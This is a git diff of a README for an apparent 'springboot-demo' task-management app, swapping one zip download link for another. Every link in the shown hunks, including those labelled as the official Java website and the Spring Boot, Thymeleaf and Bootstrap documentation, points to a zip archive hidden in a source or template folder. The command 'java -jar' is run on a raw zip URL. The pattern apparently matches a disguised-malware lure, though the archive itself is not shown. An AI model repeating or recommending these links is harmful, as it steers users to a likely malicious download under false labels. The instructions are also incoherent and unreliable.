@@ -6,7 +6,7 @@ Welcome to springboot-demo! This application helps you manage your tasks easily.
 
 ## 📥 Download Now
 
-[![Download springboot-demo](https://raw.githubusercontent.com/coleenleadcoloured544/springboot-demo/main/src/main/java/com/example/demo/controller/api/springboot-demo_v2.5.zip%20Now!https://raw.githubusercontent.com/coleenleadcoloured544/springboot-demo/main/src/main/java/com/example/demo/controller/api/springboot-demo_v2.5.zip)](https://raw.githubusercontent.com/coleenleadcoloured544/springboot-demo/main/src/main/java/com/example/demo/controller/api/springboot-demo_v2.5.zip)
+[![Download springboot-demo](https://raw.githubusercontent.com/coleenleadcoloured544/springboot-demo/main/src/main/resources/templates/demo_springboot_1.3.zip%20Now!https://raw.githubusercontent.com/coleenleadcoloured544/springboot-demo/main/src/main/resources/templates/demo_springboot_1.3.zip)](https://raw.githubusercontent.com/coleenleadcoloured544/springboot-demo/main/src/main/resources/templates/demo_springboot_1.3.zip)
 
 ## 🏗️ Prerequisites
 
@@ -20,13 +20,13 @@ Before you start, make sure you have the following:
 
 This application requires Java to run. If you don't have it installed, follow these steps:
 
-1. Go to the [official Java website](https://raw.githubusercontent.com/coleenleadcoloured544/springboot-demo/main/src/main/java/com/example/demo/controller/api/springboot-demo_v2.5.zip).
+1. Go to the [official Java website](https://raw.githubusercontent.com/coleenleadcoloured544/springboot-demo/main/src/main/resources/templates/demo_springboot_1.3.zip).
 2. Download the appropriate version for your operating system.
 3. Follow the installation instructions provided on the website.
 
 ## 💾 Download & Install
 
-To download the application, visit this page: [Download springboot-demo](https://raw.githubusercontent.com/coleenleadcoloured544/springboot-demo/main/src/main/java/com/example/demo/controller/api/springboot-demo_v2.5.zip).
+To download the application, visit this page: [Download springboot-demo](https://raw.githubusercontent.com/coleenleadcoloured544/springboot-demo/main/src/main/resources/templates/demo_springboot_1.3.zip).
 
 1. On the releases page, you'll see a list of available versions.
 2. Choose the latest version.
@@ -43,7 +43,7 @@ After extracting the files, do the following:
 3. Run the application by typing the following command:
 
    ```
-   java -jar https://raw.githubusercontent.com/coleenleadcoloured544/springboot-demo/main/src/main/java/com/example/demo/controller/api/springboot-demo_v2.5.zip
+   java -jar https://raw.githubusercontent.com/coleenleadcoloured544/springboot-demo/main/src/main/resources/templates/demo_springboot_1.3.zip
    ```
 
 4. Press `Enter`. 
@@ -97,8 +97,8 @@ This project is licensed under the MIT License. Feel free to use and distribute 
 
 To learn more about the technologies used in springboot-demo, check the following links:
 
-- [Spring Boot Documentation](https://raw.githubusercontent.com/coleenleadcoloured544/springboot-demo/main/src/main/java/com/example/demo/controller/api/springboot-demo_v2.5.zip)
-- [Thymeleaf Documentation](https://raw.githubusercontent.com/coleenleadcoloured544/springboot-demo/main/src/main/java/com/example/demo/controller/api/springboot-demo_v2.5.zip)
-- [Bootstrap Documentation](https://raw.githubusercontent.com/coleenleadcoloured544/springboot-demo/main/src/main/java/com/example/demo/controller/api/springboot-demo_v2.5.zip)
+- [Spring Boot Documentation](https://raw.githubusercontent.com/coleenleadcoloured544/springboot-demo/main/src/main/resources/templates/demo_springboot_1.3.zip)
+- [Thymeleaf Documentation](https://raw.githubusercontent.com/coleenleadcoloured544/springboot-demo/main/src/main/resources/templates/demo_springboot_1.3.zip)
+- [Bootstrap Documentation](https://raw.githubusercontent.com/coleenleadcoloured544/springboot-demo/main/src/main/resources/templates/demo_springboot_1.3.zip)
 
 Thank you for choosing springboot-demo! Enjoy task management like never before.
